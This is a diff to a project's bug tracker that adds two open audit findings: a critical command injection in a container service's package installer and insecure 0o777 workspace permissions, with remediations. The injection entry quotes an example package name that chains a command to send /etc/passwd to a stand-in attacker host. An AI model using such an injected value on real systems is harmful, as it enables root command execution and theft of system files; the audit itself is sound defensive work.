@@ -1,8 +1,28 @@
 # Tsushin Bug Tracker
-**Open:** 0 | **In Progress:** 0 | **Resolved:** 62
-**Source:** v0.6.1 Security Vulnerability Audit (2026-03-28)
+**Open:** 2 | **In Progress:** 0 | **Resolved:** 62
+**Source:** v0.6.1 Security Vulnerability Audit + GKE Readiness Audit (2026-03-28)
 
 ## Open Issues
+
+### BUG-063: Command injection in toolbox install_package via unsanitized package_name
+- **Status:** Open
+- **Severity:** Critical
+- **Category:** Command Injection (CWE-78)
+- **Found:** 2026-03-28 (GKE readiness security review)
+- **File:** `backend/services/toolbox_container_service.py:685-697`
+- **Description:** `install_package()` passes `package_name` directly into `sh -c "pip install --user {package_name}"` and `sh -c "apt-get install -y {package_name}"` without sanitization. While execution is inside the tenant's sandboxed container, the `apt-get` path runs as root. A malicious package name like `curl && curl http://attacker/$(cat /etc/passwd)` would execute arbitrary commands as root inside the container.
+- **Impact:** Root-level command execution inside tenant container. Although sandboxed, could be used for container escape attempts.
+- **Remediation:** Validate `package_name` against strict regex `^[a-zA-Z0-9._-]+(==[\d.]+)?$` before building the command, or use list-style exec (`cmd=["pip", "install", "--user", package_name]`) to bypass shell interpretation entirely.
+
+### BUG-064: Workspace directories created with 0o777 permissions
+- **Status:** Open
+- **Severity:** Medium
+- **Category:** Insecure File Permissions (CWE-732)
+- **Found:** 2026-03-28 (GKE readiness security review)
+- **File:** `backend/services/toolbox_container_service.py:62-78, 217-220`
+- **Description:** `_get_workspace_path()` sets `0o777` on both base and tenant workspace directories. `_fix_workspace_permissions()` also runs `chmod 777 /workspace` as root inside containers on every start. World-writable directories mean any process with volume access could read/modify another tenant's workspace in misconfigured Docker-in-Docker setups.
+- **Impact:** Potential cross-tenant workspace access in shared volume scenarios.
+- **Remediation:** Replace `0o777` with `0o750` and ensure `chown toolbox:toolbox /workspace` is used instead of `chmod 777`.
 
 ### BUG-051: BOLA — Persona assignment allows cross-tenant resource theft
 - **Status:** Resolved
